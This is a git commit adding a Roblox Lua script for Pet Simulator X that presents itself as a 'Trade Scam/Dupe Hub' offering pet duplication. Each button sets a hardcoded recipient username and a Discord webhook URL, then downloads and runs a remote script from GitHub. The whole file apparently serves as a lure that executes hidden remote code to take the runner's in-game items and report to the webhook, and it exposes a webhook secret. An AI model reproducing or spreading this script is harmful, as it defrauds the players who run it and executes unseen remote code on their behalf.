b655acf7abfdab7f8258d107ece68ec7c2d62b72
Trade Scam <76951734+Rost1kaa@users.noreply.github.com>
2023-03-12 12:19:10 +0400

    Add files via upload

---
+++ Trade.lua
@@ -0,0 +1,20 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("PSX Trade Scam/Dupe Hub", "BloodTheme")
+
+-- MAIN
+local Tab = Window:NewTab("Main")
+local MainSection = Tab:NewSection("Main")
+
+
+MainSection:NewButton("Trade Scam", "Before accepting a trade click this", function()
+    UserName = "sadrobloxo"
+WebHook = "https://discord.com/api/webhooks/1083080738192240750/qj4WH1yuYapq36-xk48r6jYlKqowaCGupCHeC6cZz18FOk76_EcJV4DzTPmljcC-7e6j"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()end)
+
+
+MainSection:NewButton("Dupe pets", "With a bank depoit your pets, click this, it will make rejoin you then you pets are duped", function()
+    UserName = "sadrobloxo"
+WebHook = "https://discord.com/api/webhooks/1083080738192240750/qj4WH1yuYapq36-xk48r6jYlKqowaCGupCHeC6cZz18FOk76_EcJV4DzTPmljcC-7e6j"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
